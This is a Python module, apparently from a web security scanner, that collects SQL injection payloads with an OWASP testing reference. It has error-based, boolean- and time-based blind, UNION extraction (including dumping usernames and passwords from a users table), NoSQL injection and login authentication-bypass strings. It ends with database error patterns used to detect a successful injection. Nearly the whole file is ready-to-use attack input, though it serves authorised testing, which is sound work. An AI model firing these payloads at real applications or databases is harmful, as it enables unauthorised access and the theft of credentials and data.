"""SQL Injection payload library (OWASP WSTG-INPV-05)."""

# Error-based detection
ERROR_BASED = [
    "'",
    "''",
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "1' ORDER BY 1--",
    "1' ORDER BY 100--",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "1; SELECT 1--",
    "' AND 1=CONVERT(int,(SELECT @@version))--",
    "' AND extractvalue(1,concat(0x7e,version()))--",
]

# Boolean-based blind
BOOLEAN_BLIND = [
    "' AND '1'='1",
    "' AND '1'='2",
    "' AND 1=1--",
    "' AND 1=2--",
    "' OR 1=1--",
    "' OR 1=2--",
    "1 AND 1=1",
    "1 AND 1=2",
    "' AND SUBSTRING(@@version,1,1)='5",
    "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
]

# Time-based blind
TIME_BLIND = [
    "'; WAITFOR DELAY '0:0:5'--",
    "' OR SLEEP(5)--",
    "1' AND SLEEP(5)--",
    "' AND BENCHMARK(5000000,SHA1('test'))--",
    "'; SELECT pg_sleep(5)--",
    "' || pg_sleep(5)--",
]

# UNION-based extraction
UNION_EXTRACT = [
    "' UNION SELECT username,password FROM users--",
    "' UNION SELECT table_name,NULL FROM information_schema.tables--",
    "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--",
    "' UNION ALL SELECT NULL,NULL,CONCAT(user(),0x3a,version())--",
]

# NoSQL injection
NOSQL = [
    '{"$gt":""}',
    '{"$ne":""}',
    "' || '1'=='1",
    ";return true;",
    '{"$regex":".*"}',
    "[$ne]=1",
    "[$gt]=",
    '{"username":{"$gt":""},"password":{"$gt":""}}',
]

# Grouped by technique for targeted testing
ALL_PAYLOADS = ERROR_BASED + BOOLEAN_BLIND + TIME_BLIND + UNION_EXTRACT + NOSQL

# Auth bypass payloads (for login forms)
AUTH_BYPASS = [
    "' OR 1=1--",
    "' OR '1'='1'--",
    "admin'--",
    "' OR 1=1#",
    "') OR ('1'='1'--",
    "' OR ''='",
]

# Detection patterns in responses indicating SQLi success (from nuclei templates)
ERROR_PATTERNS = [
    # MySQL
    "you have an error in your sql syntax",
    "check the manual that corresponds to your mysql server version",
    "mysqliexception",
    "mysqlsyntaxerrorexception",
    "valid mysql result",
    "unknown column",
    "com.mysql.jdbc",
    # PostgreSQL
    "postgresql.*error",
    "pg::syntaxerror",
    "org.postgresql.util.psqlexception",
    "error:  syntax error at or near",
    # SQLite (Juice Shop, many Node.js apps)
    "sqlite_error",
    "sqlite error",
    "sqlite3.operationalerror",
    "sqlite3::sqlexception",
    "sqliteexception",
    "sequelizedatabaseerror",
    "sequelizevalidationerror",
    "near \"'\": syntax error",
    "unrecognized token",
    # SQL Server
    "unclosed quotation mark",
    "sql server",
    "sqlsrvexception",
    "odbc sql server driver",
    # Oracle
    "oracle error",
    "ora-01756",
    "ora-00933",
    "quoted string not properly terminated",
    # Generic
    "microsoft ole db provider",
    "odbc microsoft access driver",
    "pg_query",
    "sqlstate",
    "mysql_fetch",
    "syntax error at or near",
    "unterminated string literal",
    "sql syntax",
    "dynamic sql error",
]
